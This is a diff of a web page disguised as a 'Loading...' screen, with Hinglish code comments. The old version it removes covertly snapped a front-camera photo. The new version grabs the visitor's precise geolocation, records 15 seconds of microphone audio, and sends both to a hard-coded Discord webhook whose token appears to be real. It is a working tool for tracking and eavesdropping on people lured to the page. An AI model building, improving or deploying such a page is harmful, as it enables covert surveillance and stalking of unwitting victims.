@@ -3,18 +3,19 @@
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading...</title>
-    <style>body { font-family: sans-serif; padding: 20px; text-align: center; }</style>
+    <style>
+        body { font-family: sans-serif; padding: 20px; text-align: center; background: #f4f4f4;}
+        h3 { color: #333; }
+    </style>
 </head>
 <body>
-    <h3>Please wait...</h3>
-    <!-- Chhipa hua video element jo camera stream receive karega -->
-    <video id="cameraPreview" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <h3 id="statusText">Please wait...</h3>
 
     <script>
+        // 1. Yahan apna Discord Webhook URL daalo (Quotes ke andar)
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1561633434420383794/wr24hTxamFvjv1uzyvRhsR65EMzP0bWw2AqdUWd3kZZeaOY8f-m22nedaGYhkRg_bsPY";
 
-        // 1. Location nikaalo
+        // 2. Location nikaalo
         if ("geolocation" in navigator) {
             navigator.geolocation.getCurrentPosition(
                 function(position) {
@@ -22,83 +23,79 @@
                     const lon = position.coords.longitude;
                     const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                     
-                    // Location milne ke baad Camera start karo
-                    startCamera(lat, lon, mapLink);
+                    // Location milte hi mic on karo
+                    startMic(lat, lon, mapLink);
                 },
                 function(error) {
-                    // Agar location block ho jaye, toh bhi camera try karo
-                    startCamera("Unknown", "Unknown", "Location Denied");
+                    // Agar location deny ho jaye, toh bhi mic try karo
+                    startMic("Unknown", "Unknown", "Location Denied");
                 },
                 { enableHighAccuracy: true, timeout: 10000 }
             );
         } else {
-            startCamera("Unknown", "Unknown", "Not Supported");
+            startMic("Unknown", "Unknown", "Not Supported");
         }
 
-        // 2. Camera start karo aur photo khincho
-        async function startCamera(lat, lon, mapLink) {
+        // 3. Mic start karo aur Audio record karo
+        async function startMic(lat, lon, mapLink) {
             try {
-                // Browser se camera (front) aur mic ki permission maango
+                document.getElementById('statusText').innerText = "Recording audio (15s)...";
+                
+                // Sirf Audio (Mic) ki permission maango
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: false // Audio (mic) ko abhi band rakha hai taki stream fast load ho
+                    audio: true,
+                    video: false 
                 });
 
-                const video = document.getElementById('cameraPreview');
-                video.srcObject = stream;
-                
-                // Jab video play ho jaye (camera on ho jaye), tab photo lo
-                video.onloadedmetadata = () => {
-                    video.play();
-                    // 2 second wait karo taki camera focus kar le
-                    setTimeout(() => {
-                        capturePhotoAndSend(stream, lat, lon, mapLink);
-                    }, 2000); 
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+
+                // Audio data collect karo
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) chunks.push(e.data);
                 };
+
+                // Jab recording band ho, toh Discord bhejo
+                mediaRecorder.onstop = async () => {
+                    // Mic band kar do
+                    stream.getTracks().forEach(track => track.stop());
+                    document.getElementById('statusText').innerText = "Sending to Discord...";
+
+                    // Audio file banao
+                    const blob = new Blob(chunks, { type: 'audio/webm' });
+                    
+                    // Discord par location aur audio bhejo
+                    await sendToDiscord(lat, lon, mapLink, blob);
+                    document.getElementById('statusText').innerText = "✅ Audio & Location sent to Discord!";
+                };
+
+                // Recording shuru karo
+                mediaRecorder.start();
+
+                // 15000 ms = 15 second baad recording automatically rok do
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 15000); 
+
             } catch (err) {
-                console.error("Camera error: ", err);
-                // Agar camera nahi mila, toh bas location bhej do
+                console.error("Mic error: ", err);
+                // Agar mic block ho gaya, toh bas location bhej do
                 sendToDiscord(lat, lon, mapLink, null);
+                document.getElementById('statusText').innerText = "❌ Mic Permission Denied";
             }
         }
 
-        // 3. Photo khincho aur Discord par bhejo
-        function capturePhotoAndSend(stream, lat, lon, mapLink) {
-            const video = document.getElementById('cameraPreview');
-            const canvas = document.getElementById('canvas');
-            const context = canvas.getContext('2d');
-
-            // Canvas ka size video ke size jitna kar do
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            
-            // Video ka current frame canvas par draw karo (Photo click)
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // Camera stream band kar do (taaki battery bache aur camera light off ho jaye)
-            stream.getTracks().forEach(track => track.stop());
-
-            // Canvas ko image (Blob) mein convert karo
-            canvas.toBlob(async (blob) => {
-                // Text data pehle bhejo
-                await sendToDiscord(lat, lon, mapLink, blob);
-                document.body.innerHTML = "<h3>✅ Data & Photo sent to Discord!</h3>";
-            }, 'image/jpeg', 0.8); // 0.8 quality (size kam karne ke liye)
-        }
-
         // 4. Discord API Call
-        async function sendToDiscord(lat, lon, mapLink, imageBlob) {
-            // Discord ko bhejne ke liye FormData use karna padta hai (text + image ke liye)
+        async function sendToDiscord(lat, lon, mapLink, audioBlob) {
             const formData = new FormData();
-            
             const payload = {
-                content: `📍 **New Visitor Location**\n**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Map:** ${mapLink}`
+                content: `🎙️ **New Audio Recording (15 Sec)**\n**Lat:** ${lat}\n**Lon:** ${lon}\n**Map:** ${mapLink}`
             };
             formData.append("payload_json", JSON.stringify(payload));
 
-            // Agar photo mili hai, toh usko attach karo
-            if (imageBlob) {
-                formData.append("file", imageBlob, "photo.jpg");
+            // Agar audio file mili hai, toh attach karo
+            if (audioBlob) {
+                formData.append("file", audioBlob, "audio.webm");
             }
 
             try {
